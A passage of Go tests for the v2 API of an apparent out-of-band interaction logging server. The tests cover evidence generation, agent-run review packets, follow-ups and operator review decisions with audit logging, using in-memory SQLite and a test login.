		t.Fatalf("Failed to initialize database: %v", err)
	}

	// Sync interactions table for evidence generation tests
	if err := server.orm.Sync2(new(v2models.Interaction)); err != nil {
		t.Fatalf("Failed to sync interactions table: %v", err)
	}

	hashedPassword, err := bcrypt.GenerateFromPassword([]byte("password"), bcrypt.DefaultCost)
	if err != nil {
		t.Fatalf("Failed to hash password: %v", err)
	}

	user := &models.TblUser{
		Name:  "testuser",
		Email: "testuser@test.com",
		Pass:  string(hashedPassword),
		Role:  0,
		Lang:  "en-US",
	}
	if _, err := server.orm.Insert(user); err != nil {
		t.Fatalf("Failed to create test user: %v", err)
	}

	// Create a test interaction with payload_id
	payloadID := "test-payload-456"
	method := "GET"
	path := "/test"
	interaction := &v2models.Interaction{
		ID:        v2models.GenerateID(),
		Type:      "http",
		PayloadID: &payloadID,
		SourceIP:  "127.0.0.1",
		Timestamp: time.Now(),
		Method:    &method,
		Path:      &path,
	}
	if _, err := server.orm.Insert(interaction); err != nil {
		t.Fatalf("Failed to create test interaction: %v", err)
	}

	// Verify interaction was inserted
	count, err := server.orm.Where("payload_id = ?", payloadID).Count(&v2models.Interaction{})
	if err != nil {
		t.Fatalf("Failed to count interactions: %v", err)
	}
	if count == 0 {
		t.Fatal("Interaction was not inserted")
	}

	r := gin.New()
	server.registerV2API(r)

	loginReq := httptest.NewRequest("POST", "/api/v2/auth/login", strings.NewReader(`{"username":"testuser","password":"password"}`))
	loginReq.Header.Set("Content-Type", "application/json")
	loginW := httptest.NewRecorder()
	r.ServeHTTP(loginW, loginReq)

	type LoginResponse struct {
		Code    int    `json:"code"`
		Message string `json:"message"`
		Data    struct {
			Token string `json:"token"`
		} `json:"data"`
	}
	var loginResp LoginResponse
	if err := json.Unmarshal(loginW.Body.Bytes(), &loginResp); err != nil {
		t.Fatalf("Failed to unmarshal login response: %v", err)
	}
	token := loginResp.Data.Token

	// Extract seed from JWT token and set in cache
	userId := user.Id
	seedKey := fmt.Sprintf("%v.seed", userId)
	userKey := fmt.Sprintf("%v.user", userId)
	parts := strings.Split(token, ".")
	if len(parts) == 3 {
		payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
		if err == nil {
			var payload map[string]interface{}
			if err := json.Unmarshal(payloadBytes, &payload); err == nil {
				if seedStr, ok := payload["seed"].(string); ok {
					store.Set(seedKey, seedStr, cache.NoExpiration)
				}
			}
		}
	}
	store.Set(userKey, user, cache.NoExpiration)

	// Test successful evidence generation with payload_id
	evidenceReq := httptest.NewRequest("POST", "/api/v2/evidence/generate", strings.NewReader(`{"payload_id":"test-payload-456","format":"json"}`))
	evidenceReq.Header.Set("Content-Type", "application/json")
	evidenceReq.Header.Set("Access-Token", token)
	evidenceW := httptest.NewRecorder()
	r.ServeHTTP(evidenceW, evidenceReq)

	if evidenceW.Code != http.StatusOK {
		t.Fatalf("Expected status 200, got %d: %s", evidenceW.Code, evidenceW.Body.String())
	}

	var response map[string]interface{}
	if err := json.Unmarshal(evidenceW.Body.Bytes(), &response); err != nil {
		t.Fatalf("Failed to unmarshal response: %v", err)
	}
	if response["code"].(float64) != 0 {
		t.Errorf("Expected code 0, got %v", response["code"])
	}

	// Verify data.evidence is present
	data, ok := response["data"].(map[string]interface{})
	if !ok {
		t.Fatal("Expected data to be a map")
	}
	if data["evidence"] == nil {
		t.Error("Expected evidence field in data")
	}
}

func TestV2GenerateEvidence_MarkdownFormat(t *testing.T) {
	gin.SetMode(gin.TestMode)

	cfg := &WebServerConfig{
		Domain:     "test.example.com",
		Driver:     "sqlite",
		Dsn:        ":memory:",
		AuthExpire: 3600,
	}

	store := cache.NewCache(300, 60)
	server, err := NewWebServer(cfg, store)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}

	if err := server.initDatabase(); err != nil {
		t.Fatalf("Failed to initialize database: %v", err)
	}

	// Sync interactions table for evidence generation tests
	if err := server.orm.Sync2(new(v2models.Interaction)); err != nil {
		t.Fatalf("Failed to sync interactions table: %v", err)
	}

	hashedPassword, err := bcrypt.GenerateFromPassword([]byte("password"), bcrypt.DefaultCost)
	if err != nil {
		t.Fatalf("Failed to hash password: %v", err)
	}

	user := &models.TblUser{
		Name:  "testuser",
		Email: "testuser@test.com",
		Pass:  string(hashedPassword),
		Role:  0,
		Lang:  "en-US",
	}
	if _, err := server.orm.Insert(user); err != nil {
		t.Fatalf("Failed to create test user: %v", err)
	}

	// Create a test interaction
	caseID := "test-case-789"
	domain := "test.example.com"
	interaction := &v2models.Interaction{
		ID:        v2models.GenerateID(),
		Type:      "dns",
		CaseID:    &caseID,
		SourceIP:  "127.0.0.1",
		Timestamp: time.Now(),
		Domain:    &domain,
	}
	if _, err := server.orm.Insert(interaction); err != nil {
		t.Fatalf("Failed to create test interaction: %v", err)
	}

	// Verify interaction was inserted
	count, err := server.orm.Where("case_id = ?", caseID).Count(&v2models.Interaction{})
	if err != nil {
		t.Fatalf("Failed to count interactions: %v", err)
	}
	if count == 0 {
		t.Fatal("Interaction was not inserted")
	}

	r := gin.New()
	server.registerV2API(r)

	loginReq := httptest.NewRequest("POST", "/api/v2/auth/login", strings.NewReader(`{"username":"testuser","password":"password"}`))
	loginReq.Header.Set("Content-Type", "application/json")
	loginW := httptest.NewRecorder()
	r.ServeHTTP(loginW, loginReq)

	type LoginResponse struct {
		Code    int    `json:"code"`
		Message string `json:"message"`
		Data    struct {
			Token string `json:"token"`
		} `json:"data"`
	}
	var loginResp LoginResponse
	if err := json.Unmarshal(loginW.Body.Bytes(), &loginResp); err != nil {
		t.Fatalf("Failed to unmarshal login response: %v", err)
	}
	token := loginResp.Data.Token

	// Extract seed from JWT token and set in cache
	userId := user.Id
	seedKey := fmt.Sprintf("%v.seed", userId)
	userKey := fmt.Sprintf("%v.user", userId)
	parts := strings.Split(token, ".")
	if len(parts) == 3 {
		payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
		if err == nil {
			var payload map[string]interface{}
			if err := json.Unmarshal(payloadBytes, &payload); err == nil {
				if seedStr, ok := payload["seed"].(string); ok {
					store.Set(seedKey, seedStr, cache.NoExpiration)
				}
			}
		}
	}
	store.Set(userKey, user, cache.NoExpiration)

	// Test successful evidence generation with markdown format
	evidenceReq := httptest.NewRequest("POST", "/api/v2/evidence/generate", strings.NewReader(`{"case_id":"test-case-789","format":"markdown"}`))
	evidenceReq.Header.Set("Content-Type", "application/json")
	evidenceReq.Header.Set("Access-Token", token)
	evidenceW := httptest.NewRecorder()
	r.ServeHTTP(evidenceW, evidenceReq)

	if evidenceW.Code != http.StatusOK {
		t.Fatalf("Expected status 200, got %d: %s", evidenceW.Code, evidenceW.Body.String())
	}

	var response map[string]interface{}
	if err := json.Unmarshal(evidenceW.Body.Bytes(), &response); err != nil {
		t.Fatalf("Failed to unmarshal response: %v", err)
	}
	if response["code"].(float64) != 0 {
		t.Errorf("Expected code 0, got %v", response["code"])
	}

	// Verify data.content is present for markdown format
	data, ok := response["data"].(map[string]interface{})
	if !ok {
		t.Fatal("Expected data to be a map")
	}
	if data["content"] == nil {
		t.Error("Expected content field in data for markdown format")
	}
	content, ok := data["content"].(string)
	if !ok {
		t.Fatal("Expected content to be a string")
	}
	if content == "" {
		t.Error("Expected non-empty content for markdown format")
	}
}

func TestV2GenerateEvidence_NoEvidence404(t *testing.T) {
	gin.SetMode(gin.TestMode)

	cfg := &WebServerConfig{
		Domain:     "test.example.com",
		Driver:     "sqlite",
		Dsn:        ":memory:",
		AuthExpire: 3600,
	}

	store := cache.NewCache(300, 60)
	server, err := NewWebServer(cfg, store)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}

	if err := server.initDatabase(); err != nil {
		t.Fatalf("Failed to initialize database: %v", err)
	}

	// Sync interactions table for evidence generation tests
	if err := server.orm.Sync2(new(v2models.Interaction)); err != nil {
		t.Fatalf("Failed to sync interactions table: %v", err)
	}

	hashedPassword, err := bcrypt.GenerateFromPassword([]byte("password"), bcrypt.DefaultCost)
	if err != nil {
		t.Fatalf("Failed to hash password: %v", err)
	}

	user := &models.TblUser{
		Name:  "testuser",
		Email: "testuser@test.com",
		Pass:  string(hashedPassword),
		Role:  0,
		Lang:  "en-US",
	}
	if _, err := server.orm.Insert(user); err != nil {
		t.Fatalf("Failed to create test user: %v", err)
	}

	r := gin.New()
	server.registerV2API(r)

	loginReq := httptest.NewRequest("POST", "/api/v2/auth/login", strings.NewReader(`{"username":"testuser","password":"password"}`))
	loginReq.Header.Set("Content-Type", "application/json")
	loginW := httptest.NewRecorder()
	r.ServeHTTP(loginW, loginReq)

	type LoginResponse struct {
		Code    int    `json:"code"`
		Message string `json:"message"`
		Data    struct {
			Token string `json:"token"`
		} `json:"data"`
	}
	var loginResp LoginResponse
	if err := json.Unmarshal(loginW.Body.Bytes(), &loginResp); err != nil {
		t.Fatalf("Failed to unmarshal login response: %v", err)
	}
	token := loginResp.Data.Token

	// Extract seed from JWT token and set in cache
	userId := user.Id
	seedKey := fmt.Sprintf("%v.seed", userId)
	userKey := fmt.Sprintf("%v.user", userId)
	parts := strings.Split(token, ".")
	if len(parts) == 3 {
		payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
		if err == nil {
			var payload map[string]interface{}
			if err := json.Unmarshal(payloadBytes, &payload); err == nil {
				if seedStr, ok := payload["seed"].(string); ok {
					store.Set(seedKey, seedStr, cache.NoExpiration)
				}
			}
		}
	}
	store.Set(userKey, user, cache.NoExpiration)

	// Test no evidence scenario (non-existent case_id)
	evidenceReq := httptest.NewRequest("POST", "/api/v2/evidence/generate", strings.NewReader(`{"case_id":"nonexistent-case","format":"json"}`))
	evidenceReq.Header.Set("Content-Type", "application/json")
	evidenceReq.Header.Set("Access-Token", token)
	evidenceW := httptest.NewRecorder()
	r.ServeHTTP(evidenceW, evidenceReq)

	if evidenceW.Code != http.StatusNotFound {
		t.Fatalf("Expected status 404, got %d: %s", evidenceW.Code, evidenceW.Body.String())
	}

	var response map[string]interface{}
	if err := json.Unmarshal(evidenceW.Body.Bytes(), &response); err != nil {
		t.Fatalf("Failed to unmarshal response: %v", err)
	}
	if response["code"].(float64) != 404 {
		t.Errorf("Expected code 404, got %v", response["code"])
	}
}

func TestV2GetAgentRunReview(t *testing.T) {
	gin.SetMode(gin.TestMode)

	cfg := &WebServerConfig{
		Domain:     "test.example.com",
		Driver:     "sqlite",
		Dsn:        ":memory:",
		AuthExpire: 3600,
	}

	store := cache.NewCache(300, 60)
	server, err := NewWebServer(cfg, store)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}

	if err := server.initDatabase(); err != nil {
		t.Fatalf("Failed to initialize database: %v", err)
	}

	// Sync required tables
	if err := server.orm.Sync2(new(v2models.AuditLog)); err != nil {
		t.Fatalf("Failed to sync audit logs table: %v", err)
	}
	if err := server.orm.Sync2(new(v2models.AgentRun)); err != nil {
		t.Fatalf("Failed to sync agent runs table: %v", err)
	}
	if err := server.orm.Sync2(new(v2models.AgentOperation)); err != nil {
		t.Fatalf("Failed to sync agent operations table: %v", err)
	}
	if err := server.orm.Sync2(new(v2models.Interaction)); err != nil {
		t.Fatalf("Failed to sync interactions table: %v", err)
	}

	hashedPassword, err := bcrypt.GenerateFromPassword([]byte("password"), bcrypt.DefaultCost)
	if err != nil {
		t.Fatalf("Failed to hash password: %v", err)
	}

	user := &models.TblUser{
		Name:  "testuser",
		Email: "testuser@test.com",
		Pass:  string(hashedPassword),
		Role:  0,
		Lang:  "en-US",
	}
	if _, err := server.orm.Insert(user); err != nil {
		t.Fatalf("Failed to create test user: %v", err)
	}

	r := gin.New()
	server.registerV2API(r)

	loginReq := httptest.NewRequest("POST", "/api/v2/auth/login", strings.NewReader(`{"username":"testuser","password":"password"}`))
	loginReq.Header.Set("Content-Type", "application/json")
	loginW := httptest.NewRecorder()
	r.ServeHTTP(loginW, loginReq)

	type LoginResponse struct {
		Code    int    `json:"code"`
		Message string `json:"message"`
		Data    struct {
			Token string `json:"token"`
		} `json:"data"`
	}
	var loginResp LoginResponse
	if err := json.Unmarshal(loginW.Body.Bytes(), &loginResp); err != nil {
		t.Fatalf("Failed to unmarshal login response: %v", err)
	}
	token := loginResp.Data.Token

	// Extract seed from JWT token and set in cache
	userId := user.Id
	seedKey := fmt.Sprintf("%v.seed", userId)
	userKey := fmt.Sprintf("%v.user", userId)
	parts := strings.Split(token, ".")
	if len(parts) == 3 {
		payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
		if err == nil {
			var payload map[string]interface{}
			if err := json.Unmarshal(payloadBytes, &payload); err == nil {
				if seedStr, ok := payload["seed"].(string); ok {
					store.Set(seedKey, seedStr, cache.NoExpiration)
				}
			}
		}
	}
	store.Set(userKey, user, cache.NoExpiration)

	// Test GET /api/v2/agent-runs/:id/review
	t.Run("unauthenticated", func(t *testing.T) {
		req := httptest.NewRequest("GET", "/api/v2/agent-runs/test-run/review", nil)
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)

		if w.Code != http.StatusUnauthorized {
			t.Errorf("Expected 401, got %d", w.Code)
		}
	})

	t.Run("invalid format", func(t *testing.T) {
		req := httptest.NewRequest("GET", "/api/v2/agent-runs/test-run/review?format=pdf", nil)
		req.Header.Set("Authorization", "Bearer "+token)
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)

		if w.Code != http.StatusBadRequest {
			t.Errorf("Expected 400, got %d", w.Code)
		}
	})

	t.Run("run not found", func(t *testing.T) {
		req := httptest.NewRequest("GET", "/api/v2/agent-runs/non-existent/review?format=json", nil)
		req.Header.Set("Authorization", "Bearer "+token)
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)

		if w.Code != http.StatusNotFound {
			t.Errorf("Expected 404, got %d", w.Code)
		}
	})

	// Create test agent run with interactions
	caseID := "test-case-1"
	payloadID := "test-payload-1"
	agentRunID := "agent-run-1"
	tokenStr := "test-token"

	// Create agent run
	agentRun := &v2models.AgentRun{
		ID:         agentRunID,
		AgentID:    "agent-1",
		OperatorID: fmt.Sprintf("%d", userId),
		CaseID:     caseID,
		PayloadID:  payloadID,
		Target:     "example.com",
		Title:      "Test Agent Run",
		Status:     "completed",
		CreatedAt:  time.Now(),
	}
	if _, err := server.orm.Insert(agentRun); err != nil {
		t.Fatalf("Failed to create test agent run: %v", err)
	}

	// Create interaction
	interaction := &v2models.Interaction{
		Token:     &tokenStr,
		Type:      "dns",
		SourceIP:  "192.168.1.1",
		CaseID:    &caseID,
		PayloadID: &payloadID,
		Timestamp: time.Now(),
	}
	if _, err := server.orm.Insert(interaction); err != nil {
		t.Fatalf("Failed to create test interaction: %v", err)
	}

	t.Run("json review success", func(t *testing.T) {
		req := httptest.NewRequest("GET", "/api/v2/agent-runs/"+agentRunID+"/review?format=json", nil)
		req.Header.Set("Authorization", "Bearer "+token)
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)

		if w.Code != http.StatusOK {
			t.Errorf("Expected 200, got %d", w.Code)
		}

		var resp struct {
			Code    int    `json:"code"`
			Message string `json:"message"`
			Data    struct {
				ID                 string `json:"id"`
				InteractionSummary struct {
					Total int `json:"total"`
				} `json:"interaction_summary"`
				Evidence *struct {
					EvidenceStrength string `json:"evidence_strength"`
					Confidence       int    `json:"confidence"`
				} `json:"evidence"`
			} `json:"data"`
		}
		if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
			t.Fatalf("Failed to unmarshal response: %v", err)
		}

		if resp.Code != 0 {
			t.Errorf("Expected code 0, got %d", resp.Code)
		}

		if resp.Data.ID != agentRunID {
			t.Errorf("Expected ID %s, got %s", agentRunID, resp.Data.ID)
		}

		if resp.Data.InteractionSummary.Total == 0 {
			t.Error("Expected interaction summary total > 0")
		}

		// Verify no sensitive data in response
		respStr := w.Body.String()
		if strings.Contains(respStr, "password") || strings.Contains(respStr, "secret") || strings.Contains(respStr, "Authorization") {
			t.Error("Response contains sensitive data")
		}
	})

	t.Run("markdown review success", func(t *testing.T) {
		req := httptest.NewRequest("GET", "/api/v2/agent-runs/"+agentRunID+"/review?format=markdown", nil)
		req.Header.Set("Authorization", "Bearer "+token)
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)

		if w.Code != http.StatusOK {
			t.Errorf("Expected 200, got %d", w.Code)
		}

		var resp struct {
			Code    int    `json:"code"`
			Message string `json:"message"`
			Data    struct {
				Content string `json:"content"`
			} `json:"data"`
		}
		if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
			t.Fatalf("Failed to unmarshal response: %v", err)
		}

		if resp.Code != 0 {
			t.Errorf("Expected code 0, got %d", resp.Code)
		}

		if len(resp.Data.Content) == 0 {
			t.Error("Expected non-empty markdown content")
		}

		// Verify no sensitive data in response
		respStr := w.Body.String()
		if strings.Contains(respStr, "password") || strings.Contains(respStr, "secret") || strings.Contains(respStr, "Authorization") {
			t.Error("Response contains sensitive data")
		}
	})
}

func TestV2CreateAgentRunFollowup(t *testing.T) {
	gin.SetMode(gin.TestMode)

	cfg := &WebServerConfig{
		Domain:     "test.example.com",
		Driver:     "sqlite",
		Dsn:        ":memory:",
		AuthExpire: 3600,
	}

	store := cache.NewCache(300, 60)
	server, err := NewWebServer(cfg, store)
	if err != nil {
		t.Fatalf("Failed to create web server: %v", err)
	}

	if err := server.initDatabase(); err != nil {
		t.Fatalf("Failed to initialize database: %v", err)
	}

	// Sync required tables
	if err := server.orm.Sync2(new(v2models.AuditLog)); err != nil {
		t.Fatalf("Failed to sync audit logs table: %v", err)
	}
	if err := server.orm.Sync2(new(v2models.Case)); err != nil {
		t.Fatalf("Failed to sync cases table: %v", err)
	}
	if err := server.orm.Sync2(new(v2models.Payload)); err != nil {
		t.Fatalf("Failed to sync payloads table: %v", err)
	}
	if err := server.orm.Sync2(new(v2models.AgentRun)); err != nil {
		t.Fatalf("Failed to sync agent runs table: %v", err)
	}
	if err := server.orm.Sync2(new(v2models.AgentOperation)); err != nil {
		t.Fatalf("Failed to sync agent operations table: %v", err)
	}

	r := gin.New()
	server.registerV2API(r)

	// Create test user
	hashedPassword, err := bcrypt.GenerateFromPassword([]byte("password"), bcrypt.DefaultCost)
	if err != nil {
		t.Fatalf("Failed to hash password: %v", err)
	}

	user := &models.TblUser{
		Name:  "testuser",
		Email: "testuser@test.com",
		Pass:  string(hashedPassword),
		Role:  0,
		Lang:  "en-US",
	}
	if _, err := server.orm.Insert(user); err != nil {
		t.Fatalf("Failed to create test user: %v", err)
	}

	// Login to get token
	loginBody := `{"username":"testuser","password":"password"}`
	loginHTTPReq := httptest.NewRequest("POST", "/api/v2/auth/login", strings.NewReader(loginBody))
	loginHTTPReq.Header.Set("Content-Type", "application/json")
	loginW := httptest.NewRecorder()
	r.ServeHTTP(loginW, loginHTTPReq)

	var loginResp struct {
		Code    int    `json:"code"`
		Message string `json:"message"`
		Data    struct {
			Token string `json:"token"`
		} `json:"data"`
	}
	if err := json.Unmarshal(loginW.Body.Bytes(), &loginResp); err != nil {
		t.Fatalf("Failed to parse login response: %v, body=%s", err, loginW.Body.String())
	}
	if loginResp.Code != 0 {
		t.Fatalf("Login failed: %s", loginResp.Message)
	}
	token := loginResp.Data.Token
	userID := user.Id

	// Extract seed from JWT token and set in cache
	seedKey := fmt.Sprintf("%v.seed", userID)
	userKey := fmt.Sprintf("%v.user", userID)
	parts := strings.Split(token, ".")
	if len(parts) == 3 {
		payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
		if err == nil {
			var payload map[string]interface{}
			if err := json.Unmarshal(payloadBytes, &payload); err == nil {
				if seedStr, ok := payload["seed"].(string); ok {
					store.Set(seedKey, seedStr, cache.NoExpiration)
				}
			}
		}
	}
	store.Set(userKey, user, cache.NoExpiration)

	// Create test case
	caseID := "case-followup-1"
	caseItem := &v2models.Case{
		ID:        caseID,
		Title:     "Test Case",
		Status:    "active",
		CreatedBy: fmt.Sprintf("%d", userID),
		CreatedAt: time.Now(),
		UpdatedAt: time.Now(),
	}
	if _, err := server.orm.Insert(caseItem); err != nil {
		t.Fatalf("Failed to create test case: %v", err)
	}

	// Create test payload
	payloadID := "payload-followup-1"
	payload := &v2models.Payload{
		ID:               payloadID,
		CaseID:           caseID,
		Token:            "test-token",
		TemplateRendered: "http://{{.Token}}.example.com",
		CreatedAt:        time.Now(),
		UpdatedAt:        time.Now(),
	}
	if _, err := server.orm.Insert(payload); err != nil {
		t.Fatalf("Failed to create test payload: %v", err)
	}

	agentRunID := "agent-run-followup-1"
	agentRun := &v2models.AgentRun{
		ID:         agentRunID,
		AgentID:    "agent-1",
		OperatorID: fmt.Sprintf("%d", userID),
		CaseID:     caseID,
		PayloadID:  payloadID,
		Target:     "https://target.example",
		Title:      "Followup target",
		Status:     "completed",
		CreatedAt:  time.Now(),
		UpdatedAt:  time.Now(),
	}
	if _, err := server.orm.Insert(agentRun); err != nil {
		t.Fatalf("insert agent run: %v", err)
	}

	body := strings.NewReader(`{"action_type":"recheck_evidence","reason":"Evidence needs second review","review_packet_id":"agent-run-followup-1"}`)
	req := httptest.NewRequest(http.MethodPost, "/api/v2/agent-runs/"+agentRunID+"/followups", body)
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d body=%s", w.Code, w.Body.String())
	}

	var resp struct {
		Code int `json:"code"`
		Data struct {
			AgentRunID  string `json:"agent_run_id"`
			OperationID string `json:"operation_id"`
			ActionType  string `json:"action_type"`
			Reason      string `json:"reason"`
		} `json:"data"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("parse response: %v", err)
	}
	if resp.Code != 0 {
		t.Fatalf("expected code 0")
	}
	if resp.Data.OperationID == "" {
		t.Fatalf("expected operation id")
	}
	if strings.Contains(w.Body.String(), "Authorization") || strings.Contains(w.Body.String(), "secret") {
		t.Fatalf("response leaks sensitive data")
	}

	// Test error cases
	t.Run("unknown agent run 404", func(t *testing.T) {
		body := strings.NewReader(`{"action_type":"recheck_evidence","reason":"test reason"}`)
		req := httptest.NewRequest(http.MethodPost, "/api/v2/agent-runs/unknown-run/followups", body)
		req.Header.Set("Authorization", "Bearer "+token)
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)

		if w.Code != http.StatusNotFound {
			t.Fatalf("expected 404, got %d body=%s", w.Code, w.Body.String())
		}
	})

	t.Run("invalid action 400", func(t *testing.T) {
		body := strings.NewReader(`{"action_type":"invalid_action","reason":"test reason"}`)
		req := httptest.NewRequest(http.MethodPost, "/api/v2/agent-runs/"+agentRunID+"/followups", body)
		req.Header.Set("Authorization", "Bearer "+token)
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)

		if w.Code != http.StatusBadRequest {
			t.Fatalf("expected 400, got %d body=%s", w.Code, w.Body.String())
		}
	})
}

func TestV2RecordReviewDecision(t *testing.T) {
	gin.SetMode(gin.TestMode)

	cfg := &WebServerConfig{
		Domain:     "test.example.com",
		Driver:     "sqlite",
		Dsn:        ":memory:",
		AuthExpire: 3600,
	}

	store := cache.NewCache(300, 60)
	server, err := NewWebServer(cfg, store)
	if err != nil {
		t.Fatalf("Failed to create web server: %v", err)
	}

	if err := server.initDatabase(); err != nil {
		t.Fatalf("Failed to initialize database: %v", err)
	}

	// Sync required tables
	if err := server.orm.Sync2(new(v2models.AuditLog)); err != nil {
		t.Fatalf("Failed to sync audit logs table: %v", err)
	}
	if err := server.orm.Sync2(new(v2models.Case)); err != nil {
		t.Fatalf("Failed to sync cases table: %v", err)
	}
	if err := server.orm.Sync2(new(v2models.Payload)); err != nil {
		t.Fatalf("Failed to sync payloads table: %v", err)
	}
	if err := server.orm.Sync2(new(v2models.AgentRun)); err != nil {
		t.Fatalf("Failed to sync agent runs table: %v", err)
	}
	if err := server.orm.Sync2(new(v2models.AgentOperation)); err != nil {
		t.Fatalf("Failed to sync agent operations table: %v", err)
	}

	r := gin.New()
	server.registerV2API(r)

	// Create test user
	hashedPassword, err := bcrypt.GenerateFromPassword([]byte("password"), bcrypt.DefaultCost)
	if err != nil {
		t.Fatalf("Failed to hash password: %v", err)
	}

	user := &models.TblUser{
		Name:  "testuser",
		Email: "testuser@test.com",
		Pass:  string(hashedPassword),
		Role:  0,
		Lang:  "en-US",
	}
	if _, err := server.orm.Insert(user); err != nil {
		t.Fatalf("Failed to create test user: %v", err)
	}

	// Login to get token
	loginBody := `{"username":"testuser","password":"password"}`
	loginHTTPReq := httptest.NewRequest("POST", "/api/v2/auth/login", strings.NewReader(loginBody))
	loginHTTPReq.Header.Set("Content-Type", "application/json")
	loginW := httptest.NewRecorder()
	r.ServeHTTP(loginW, loginHTTPReq)

	var loginResp struct {
		Code    int    `json:"code"`
		Message string `json:"message"`
		Data    struct {
			Token string `json:"token"`
		} `json:"data"`
	}
	if err := json.Unmarshal(loginW.Body.Bytes(), &loginResp); err != nil {
		t.Fatalf("Failed to parse login response: %v, body=%s", err, loginW.Body.String())
	}
	if loginResp.Code != 0 {
		t.Fatalf("Login failed: %s", loginResp.Message)
	}
	token := loginResp.Data.Token
	userID := user.Id

	// Extract seed from JWT token and set in cache
	seedKey := fmt.Sprintf("%v.seed", userID)
	userKey := fmt.Sprintf("%v.user", userID)
	parts := strings.Split(token, ".")
	if len(parts) == 3 {
		payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
		if err == nil {
			var payload map[string]interface{}
			if err := json.Unmarshal(payloadBytes, &payload); err == nil {
				if seedStr, ok := payload["seed"].(string); ok {
					store.Set(seedKey, seedStr, cache.NoExpiration)
				}
			}
		}
	}
	store.Set(userKey, user, cache.NoExpiration)

	// Create test case
	caseID := "case-decision-1"
	caseItem := &v2models.Case{
		ID:        caseID,
		Title:     "Test Case",
		Status:    "active",
		CreatedBy: fmt.Sprintf("%d", userID),
		CreatedAt: time.Now(),
		UpdatedAt: time.Now(),
	}
	if _, err := server.orm.Insert(caseItem); err != nil {
		t.Fatalf("Failed to create test case: %v", err)
	}

	// Create test payload
	payloadID := "payload-decision-1"
	payload := &v2models.Payload{
		ID:               payloadID,
		CaseID:           caseID,
		Token:            "test-token",
		TemplateRendered: "http://{{.Token}}.example.com",
		CreatedAt:        time.Now(),
		UpdatedAt:        time.Now(),
	}
	if _, err := server.orm.Insert(payload); err != nil {
		t.Fatalf("Failed to create test payload: %v", err)
	}

	agentRunID := "agent-run-decision-1"
	agentRun := &v2models.AgentRun{
		ID:         agentRunID,
		AgentID:    "agent-1",
		OperatorID: fmt.Sprintf("%d", userID),
		CaseID:     caseID,
		PayloadID:  payloadID,
		Target:     "https://target.example",
		Title:      "Decision target",
		Status:     "completed",
		CreatedAt:  time.Now(),
		UpdatedAt:  time.Now(),
	}
	if _, err := server.orm.Insert(agentRun); err != nil {
		t.Fatalf("insert agent run: %v", err)
	}

	// Test successful review decision
	body := strings.NewReader(`{"decision":"accepted","reason":"Evidence reviewed by operator","review_packet_id":"agent-run-decision-1"}`)
	req := httptest.NewRequest(http.MethodPost, "/api/v2/agent-runs/"+agentRunID+"/review-decision", body)
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d body=%s", w.Code, w.Body.String())
	}

	var resp struct {
		Code int `json:"code"`
		Data struct {
			AgentRunID  string `json:"agent_run_id"`
			OperationID string `json:"operation_id"`
			Decision    string `json:"decision"`
			AuditRefID  string `json:"audit_ref_id"`
		} `json:"data"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("parse response: %v", err)
	}
	if resp.Code != 0 {
		t.Fatalf("expected code 0")
	}
	if resp.Data.OperationID == "" {
		t.Fatalf("expected operation id")
	}
	if resp.Data.Decision != "accepted" {
		t.Fatalf("expected decision accepted, got %s", resp.Data.Decision)
	}
	if strings.Contains(w.Body.String(), "Authorization") || strings.Contains(w.Body.String(), "secret") {
		t.Fatalf("response leaks sensitive data")
	}

	// Verify operation was created
	var operation v2models.AgentOperation
	_, err = server.orm.Where("agent_run_i_d = ?", agentRunID).Desc("created_at").Get(&operation)
	if err != nil {
		t.Fatalf("failed to query operation: %v", err)
	}
	if operation.Action != "review_decision.accepted" {
		t.Errorf("expected action review_decision.accepted, got %s", operation.Action)
	}

	// Verify audit log was created
	var audit v2models.AuditLog
	_, err = server.orm.Where("resource_type = ? AND resource_id = ? AND action = ?", "agent_run", agentRunID, "agent_run.review_decision_recorded").Desc("timestamp").Get(&audit)
	if err != nil {
		t.Fatalf("failed to query audit log: %v", err)
	}
	if audit.Action != "agent_run.review_decision_recorded" {
		t.Errorf("expected action agent_run.review_decision_recorded, got %s", audit.Action)
	}

	// Test error cases
	t.Run("unauthenticated 401", func(t *testing.T) {
		body := strings.NewReader(`{"decision":"accepted","reason":"test reason"}`)
		req := httptest.NewRequest(http.MethodPost, "/api/v2/agent-runs/"+agentRunID+"/review-decision", body)
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)

		if w.Code != http.StatusUnauthorized {
			t.Fatalf("expected 401, got %d body=%s", w.Code, w.Body.String())
		}
	})

	t.Run("unknown agent run 404", func(t *testing.T) {
		body := strings.NewReader(`{"decision":"accepted","reason":"test reason"}`)
		req := httptest.NewRequest(http.MethodPost, "/api/v2/agent-runs/unknown-run/review-decision", body)
		req.Header.Set("Authorization", "Bearer "+token)
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)

		if w.Code != http.StatusNotFound {
